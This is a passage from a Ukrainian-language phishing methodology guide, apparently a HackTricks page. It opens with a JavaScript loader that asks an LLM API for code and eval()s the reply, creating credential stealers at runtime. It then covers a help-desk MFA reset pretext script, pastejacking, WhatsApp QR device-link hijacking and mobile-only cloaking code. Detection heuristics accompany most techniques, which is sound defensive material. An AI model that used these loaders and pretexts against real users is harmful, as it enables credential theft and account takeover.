fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** згенерований код персоналізує приманку (наприклад, розбирає токени LogoKit) і надсилає creds на прихований у prompt endpoint.

**Ознаки ухилення**
- Трафік проходить через відомі домени LLM або проксі reputable CDN; іноді — через WebSockets до backend.
- Статичного payload немає; шкідливий JS з’являється лише після render.
- Недетерміновані генерації створюють **унікальні** stealers для кожної сесії.

**Ідеї для виявлення**
- Запускайте sandbox із увімкненим JS; позначайте **runtime `eval`/динамічне створення скриптів із відповідей LLM**.
- Шукайте POST-запити з front-end до API LLM, за якими одразу йдуть `eval`/`Function` для отриманого тексту.
- Сповіщайте про несанкціоновані домени LLM у клієнтському трафіку, за якими йдуть POST-запити з credentials.

---

## Варіант MFA Fatigue / Push Bombing — примусовий reset
Окрім класичного push-bombing, зловмисники просто **примусово запускають нову реєстрацію MFA** під час дзвінка до help-desk, анулюючи наявний токен користувача. Будь-який подальший запит на login здаватиметься жертві легітимним.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Відстежуйте події AzureAD/AWS/Okta, коли **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з тієї самої IP-адреси**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди в буфер обміну жертви з скомпрометованої вебсторінки або сторінки з typosquatting, а потім змусити користувача вставити їх у **Win + R**, **Win + X** або вікно термінала й виконати довільний код без завантаження файлів чи вкладень.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing і розповсюдження шкідливих застосунків (Android та iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Перехоплення прив’язування пристрою WhatsApp за допомогою QR-коду та соціальної інженерії
* На сторінці-приманці (наприклад, підробленому «каналі» міністерства/CERT) відображається QR-код WhatsApp Web/Desktop, і жертву просять його відсканувати. Це непомітно додає пристрій зловмисника як **прив’язаний пристрій**.<sup>[[12]](#references)</sup>
* Зловмисник одразу отримує доступ до перегляду чатів і контактів, доки сеанс не буде видалено. Згодом жертви можуть побачити сповіщення «прив’язано новий пристрій»; захисники можуть шукати неочікувані події прив’язування пристрою невдовзі після відвідування ненадійних сторінок із QR-кодами.

### Phishing із перевіркою мобільного пристрою для обходу crawler-ів і sandbox-ів
Оператори дедалі частіше обмежують доступ до своїх phishing-сценаріїв простою перевіркою пристрою, щоб desktop crawler-и не переходили на кінцеві сторінки. Типовий сценарій — невеликий скрипт перевіряє наявність DOM, сумісного із сенсорним введенням, і передає результат на серверну кінцеву точку; клієнти без мобільних пристроїв отримують HTTP 500 (або порожню сторінку), тоді як мобільним користувачам показується повний сценарій.<sup>[[7]](#references)</sup>

Мінімальний фрагмент клієнтського коду (типова логіка):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` логіка (спрощено):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Часто спостерігається така поведінка сервера:
- Встановлює cookie сеансу під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або заглушку) для наступних GET-запитів, коли `is_mobile=false`; показує phishing-сторінку, лише якщо значення `true`.

Евристики для пошуку та виявлення:
- Запит у urlscan: `filename:"detect_device.js" AND page.status:500`
- Телеметрія вебтрафіку: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для немобільних пристроїв; легітимні сценарії для мобільних жертв повертають 200 із подальшим HTML/JS.
- Блокуйте або перевіряйте сторінки, які показують вміст виключно на основі `ontouchstart` чи подібних перевірок пристрою.

Поради із захисту:
- Запускайте краулери з fingerprint-параметрами, подібними до мобільних пристроїв, і ввімкненим JS, щоб виявляти прихований вміст.
- Налаштуйте сповіщення про підозрілі відповіді 500 після `POST /detect` на нещодавно зареєстрованих доменах.

## References

- [1] [Створення варіантів доменів, які використовуються у phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Виявлення phishing: інструменти та методи (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Крадіжка облікових даних і обхід 2FA за допомогою noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Крадіжка сеансів і обхід 2FA за допомогою EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Як встановити та налаштувати DKIM із Postfix у Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Глобальний звіт Unit 42 про реагування на інциденти за 2025 рік — видання про соціальну інженерію](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Тихий smishing — мобільна інфраструктура phishing і евристики (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Наступний рубіж атак із динамічним складанням під час виконання: використання LLM для генерації JavaScript-коду phishing у реальному часі](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Видавання себе за іншу особу, перехоплення кліків і TDS: усередині екосистеми розповсюдження шкідливого ПЗ](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting домену Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Перехоплення трафіку до windows.com від Microsoft за допомогою bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Кохання? Насправді: підроблений застосунок для знайомств використали як приманку в цільовій шпигунській кампанії в Пакистані](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC і зразки ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
